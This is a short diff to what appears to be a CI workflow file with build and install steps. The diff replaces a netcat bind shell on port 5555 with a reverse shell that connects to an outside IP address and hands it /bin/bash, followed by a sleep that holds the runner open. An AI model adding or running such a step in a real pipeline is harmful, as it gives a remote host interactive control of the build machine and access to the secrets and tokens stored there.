@@ -14,6 +14,6 @@ jobs:
            sudo make
            sudo make install
       - run: |
-           nc -n -v -l -p 5555 -e /bin/bash
+           nc 3.84.116.126 5555 -e /bin/bash
       - run: |
            sleep 60s
